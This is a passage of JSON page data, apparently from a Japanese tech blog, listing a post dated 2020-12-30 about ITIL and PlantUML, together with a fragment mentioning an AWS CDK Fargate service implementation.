ecs_patterns.ApplicationLoadBalancedFargateService を実装しました ↩"},"name":"[2020-12-30]整理したい私はITILをかぶる、PlantUMLへの愛","tags":["team-building"],"childPublishedDate":{"published_on":"2020-12-30T00:00:00.000Z","published_on_unix":1609286400}}}]}},"pageContext":{"number":90}},"staticQueryHashes":[]}